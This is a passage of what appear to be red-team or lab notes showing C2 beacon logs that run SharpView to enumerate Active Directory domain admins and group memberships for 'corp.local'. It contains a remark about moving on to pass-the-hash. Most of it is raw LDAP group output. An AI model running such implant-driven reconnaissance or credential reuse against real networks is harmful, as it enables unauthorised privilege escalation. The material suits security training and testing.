Domain Admin users
```
[10/19 16:28:20] beacon> execute-assembly /root/tooltesting/SharpView.exe Get-NetGroupMember -GroupName "Domain Admins" -Recurse

get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainObject] Extracted domain 'corp.local' from 'CN=Administrator,CN=Users,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC=corp,DC=local

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=corp,DC=local)))

GroupDomain                    : corp,local

GroupName                      : Administrators

GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=corp,DC=local

MemberDomain                   : corp.local

MemberName                     : coco

MemberDistinguishedName        : CN=coco,CN=Users,DC=corp,DC=local

MemberObjectClass              : user

MemberSID                      : S-1-5-21-2291914956-3290296217-2402366952-14603



GroupDomain                    : corp,local

GroupName                      : Administrators

GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=corp,DC=local

MemberDomain                   : corp.local

MemberName                     : Domain Admins

MemberDistinguishedName        : CN=Domain Admins,CN=Users,DC=corp,DC=local

MemberObjectClass              : group

MemberSID                      : S-1-5-21-2291914956-3290296217-2402366952-512



GroupDomain                    : corp,local

GroupName                      : Administrators

GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=corp,DC=local

MemberDomain                   : corp.local

MemberName                     : Enterprise Admins

MemberDistinguishedName        : CN=Enterprise Admins,CN=Users,DC=corp,DC=local

MemberObjectClass              : group

MemberSID                      : S-1-5-21-2291914956-3290296217-2402366952-519



GroupDomain                    : corp,local

GroupName                      : Administrators

GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=corp,DC=local

MemberDomain                   : corp.local

MemberName                     : Administrator

MemberDistinguishedName        : CN=Administrator,CN=Users,DC=corp,DC=local

MemberObjectClass              : user

MemberSID                      : S-1-5-21-2291914956-3290296217-2402366952-500

```
Groups that Administrator is used with - going to pth
```powershell
[10/19 16:30:58] beacon> execute-assembly /root/tooltesting/SharpView.exe Get-NetGroup –UserName "Administrator"
[10/19 16:31:01] [*] Tasked beacon to run .NET program: SharpView.exe Get-NetGroup –UserName "Administrator"
[10/19 16:31:01] [+] host called home, sent: 843895 bytes
[10/19 16:31:02] [+] received output:
get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainGroup] filter string: (&(objectCategory=group))


[10/19 16:31:03] [+] received output:
objectsid                      : {S-1-5-32-544}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 0975a503-b4f0-40cd-b643-944983c3d1b0

name                           : Administrators

distinguishedname              : CN=Administrators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 10/19/2023 5:07:41 PM

samaccountname                 : Administrators

member                         : {CN=coco,CN=Users,DC=corp,DC=local, CN=Domain Admins,CN=Users,DC=corp,DC=local, CN=Enterprise Admins,CN=Users,DC=corp,DC=local, CN=Administrator,CN=Users,DC=corp,DC=local}

cn                             : {Administrators}

objectclass                    : {top, group}

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

usnchanged                     : 531705

description                    : Administrators have complete and unrestricted access to the computer/domain

instancetype                   : 4

usncreated                     : 8200

admincount                     : 1

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-545}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : e8d9955e-bc72-43fd-aacc-ad33f59af0b0

name                           : Users

distinguishedname              : CN=Users,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Users

member                         : {CN=Domain Users,CN=Users,DC=corp,DC=local, CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=corp,DC=local, CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=corp,DC=local}

cn                             : {Users}

objectclass                    : {top, group}

usnchanged                     : 12381

description                    : Users are prevented from making accidental or intentional system-wide changes and can run most applications

instancetype                   : 4

usncreated                     : 8203

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-546}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 974a8f7a-8051-4dcd-88f0-71575e6c1bbd

name                           : Guests

distinguishedname              : CN=Guests,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Guests

member                         : {CN=Domain Guests,CN=Users,DC=corp,DC=local, CN=Guest,CN=Users,DC=corp,DC=local}

cn                             : {Guests}

objectclass                    : {top, group}

usnchanged                     : 12383

description                    : Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted

instancetype                   : 4

usncreated                     : 8209

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-550}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : afe045cc-33a9-4657-b176-096e832eccd9

name                           : Print Operators

distinguishedname              : CN=Print Operators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 4/24/2018 5:16:10 AM

samaccountname                 : Print Operators

cn                             : {Print Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 42610

instancetype                   : 4

usncreated                     : 8212

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

admincount                     : 1

description                    : Members can administer printers installed on domain controllers

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-551}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : ba106e0f-bf36-4ba6-9919-8e53780f568f

name                           : Backup Operators

distinguishedname              : CN=Backup Operators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 4/24/2018 5:16:10 AM

samaccountname                 : Backup Operators

cn                             : {Backup Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 42607

instancetype                   : 4

usncreated                     : 8213

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

admincount                     : 1

description                    : Backup Operators can override security restrictions for the sole purpose of backing up or restoring files

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-552}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 02790fe7-c179-4045-8c69-9c592676bbb7

name                           : Replicator

distinguishedname              : CN=Replicator,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 4/24/2018 5:16:10 AM

samaccountname                 : Replicator

cn                             : {Replicator}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 42611

instancetype                   : 4

usncreated                     : 8214

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

admincount                     : 1

description                    : Supports file replication in a domain

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-555}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 2cb04ad8-5560-418a-bdf3-5ea6c1688d72

name                           : Remote Desktop Users

distinguishedname              : CN=Remote Desktop Users,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 10/19/2023 5:07:54 PM

samaccountname                 : Remote Desktop Users

member                         : {CN=coco,CN=Users,DC=corp,DC=local}

cn                             : {Remote Desktop Users}

objectclass                    : {top, group}

usnchanged                     : 531707

description                    : Members in this group are granted the right to logon remotely

instancetype                   : 4

usncreated                     : 8215

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-556}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 8872a80e-deda-49f6-ab3a-01e323d1d590

name                           : Network Configuration Operators

distinguishedname              : CN=Network Configuration Operators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Network Configuration Operators

cn                             : {Network Configuration Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8216

instancetype                   : 4

usncreated                     : 8216

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members in this group can have some administrative privileges to manage configuration of networking features

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-558}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 66ab0327-d6cb-43e4-9f0a-3d429973cca1

name                           : Performance Monitor Users

distinguishedname              : CN=Performance Monitor Users,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Performance Monitor Users

cn                             : {Performance Monitor Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8217

instancetype                   : 4

usncreated                     : 8217

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group can access performance counter data locally and remotely

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-559}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 7358a0ef-e58b-4149-b26a-1c0526a2440a

name                           : Performance Log Users

distinguishedname              : CN=Performance Log Users,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Performance Log Users

cn                             : {Performance Log Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8218

instancetype                   : 4

usncreated                     : 8218

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-562}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 6e6b00f2-b320-4b0c-8d30-a520602c2605

name                           : Distributed COM Users

distinguishedname              : CN=Distributed COM Users,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Distributed COM Users

cn                             : {Distributed COM Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8219

instancetype                   : 4

usncreated                     : 8219

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members are allowed to launch, activate and use Distributed COM objects on this machine.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-568}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 9359af38-2f7f-46d1-bc65-1ce547878768

name                           : IIS_IUSRS

distinguishedname              : CN=IIS_IUSRS,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : IIS_IUSRS

member                         : {CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=corp,DC=local}

cn                             : {IIS_IUSRS}

objectclass                    : {top, group}

usnchanged                     : 8223

description                    : Built-in group used by Internet Information Services.

instancetype                   : 4

usncreated                     : 8220

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-569}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 74b20460-38b2-4eea-8980-6ad0c10b0e12

name                           : Cryptographic Operators

distinguishedname              : CN=Cryptographic Operators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Cryptographic Operators

cn                             : {Cryptographic Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8224

instancetype                   : 4

usncreated                     : 8224

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members are authorized to perform cryptographic operations.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-573}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : a72ace2e-56c4-486c-9547-9a7b7ff3f7f2

name                           : Event Log Readers

distinguishedname              : CN=Event Log Readers,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Event Log Readers

cn                             : {Event Log Readers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8225

instancetype                   : 4

usncreated                     : 8225

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group can read event logs from local machine

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-574}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 2e1fa22d-47b7-41ce-be2c-424fcf104ef6

name                           : Certificate Service DCOM Access

distinguishedname              : CN=Certificate Service DCOM Access,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Certificate Service DCOM Access

cn                             : {Certificate Service DCOM Access}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8226

instancetype                   : 4

usncreated                     : 8226

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group are allowed to connect to Certification Authorities in the enterprise

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-575}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 629b80f4-98f2-42ee-a0ee-ab7f330c00d9

name                           : RDS Remote Access Servers

distinguishedname              : CN=RDS Remote Access Servers,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : RDS Remote Access Servers

cn                             : {RDS Remote Access Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8227

instancetype                   : 4

usncreated                     : 8227

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-576}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 31f800c3-196d-4941-abfa-2c8ce4c48f98

name                           : RDS Endpoint Servers

distinguishedname              : CN=RDS Endpoint Servers,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : RDS Endpoint Servers

cn                             : {RDS Endpoint Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8228

instancetype                   : 4

usncreated                     : 8228

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-577}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 52bf694d-c827-4e47-ae80-529924f196d2

name                           : RDS Management Servers

distinguishedname              : CN=RDS Management Servers,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : RDS Management Servers

cn                             : {RDS Management Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8229

instancetype                   : 4

usncreated                     : 8229

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-578}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 7f072b85-839d-4d63-aef5-227832988f7f

name                           : Hyper-V Administrators

distinguishedname              : CN=Hyper-V Administrators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Hyper-V Administrators

cn                             : {Hyper-V Administrators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8230

instancetype                   : 4

usncreated                     : 8230

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group have complete and unrestricted access to all features of Hyper-V.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-579}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 7f0802f9-a8ca-477f-b3e1-b9999c10a301

name                           : Access Control Assistance Operators

distinguishedname              : CN=Access Control Assistance Operators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Access Control Assistance Operators

cn                             : {Access Control Assistance Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8231

instancetype                   : 4

usncreated                     : 8231

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group can remotely query authorization attributes and permissions for resources on this computer.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-580}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 274a4fd3-af70-4793-8255-3be531cbeffb

name                           : Remote Management Users

distinguishedname              : CN=Remote Management Users,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Remote Management Users

cn                             : {Remote Management Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8232

instancetype                   : 4

usncreated                     : 8232

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-581}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 1c9e23a9-4504-4c34-90a3-4afba8448175

name                           : System Managed Accounts Group

distinguishedname              : CN=System Managed Accounts Group,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : System Managed Accounts Group

member                         : {CN=DefaultAccount,CN=Users,DC=corp,DC=local}

cn                             : {System Managed Accounts Group}

objectclass                    : {top, group}

usnchanged                     : 8235

description                    : Members of this group are managed by the system.

instancetype                   : 4

usncreated                     : 8233

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-582}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 7886273c-62df-45c8-8128-35b528d69f2a

name                           : Storage Replica Administrators

distinguishedname              : CN=Storage Replica Administrators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:02 AM

whenchanged                    : 3/28/2018 12:37:02 AM

samaccountname                 : Storage Replica Administrators

cn                             : {Storage Replica Administrators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8236

instancetype                   : 4

usncreated                     : 8236

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group have complete and unrestricted access to all features of Storage Replica.

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-515}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 58252ae3-3c08-41dd-a23d-2684fd511729

name                           : Domain Computers

distinguishedname              : CN=Domain Computers,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Domain Computers

cn                             : {Domain Computers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12332

instancetype                   : 4

usncreated                     : 12330

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : All workstations and servers joined to the domain

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-516}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 90908770-2bb0-4718-aaa3-c6ffed23dfa6

name                           : Domain Controllers

distinguishedname              : CN=Domain Controllers,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 4/24/2018 5:16:10 AM

samaccountname                 : Domain Controllers

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local}

cn                             : {Domain Controllers}

objectclass                    : {top, group}

usnchanged                     : 42613

description                    : All domain controllers in the domain

instancetype                   : 4

usncreated                     : 12333

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-518}

grouptype                      : UNIVERSAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 974ade57-dd33-4dd5-bbbf-349f2e54c0c7

name                           : Schema Admins

distinguishedname              : CN=Schema Admins,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 4/25/2018 5:46:29 PM

samaccountname                 : Schema Admins

member                         : {CN=iamtheadministrator,OU=Operations,OU=Corp,DC=corp,DC=local, CN=Administrator,CN=Users,DC=corp,DC=local}

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local}

cn                             : {Schema Admins}

objectclass                    : {top, group}

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

usnchanged                     : 44627

description                    : Designated administrators of the schema

instancetype                   : 4

usncreated                     : 12336

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-519}

grouptype                      : UNIVERSAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : a31f7da8-3641-4383-8def-0a6b93d811d7

name                           : Enterprise Admins

distinguishedname              : CN=Enterprise Admins,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 5/1/2018 7:59:00 PM

samaccountname                 : Enterprise Admins

member                         : {CN=iamtheadministrator,OU=Operations,OU=Corp,DC=corp,DC=local, CN=Administrator,CN=Users,DC=corp,DC=local}

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local, CN=Administrators,CN=Builtin,DC=corp,DC=local}

cn                             : {Enterprise Admins}

objectclass                    : {top, group}

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

usnchanged                     : 77743

description                    : Designated administrators of the enterprise

instancetype                   : 4

usncreated                     : 12339

admincount                     : 1

iscriticalsystemobject         : True

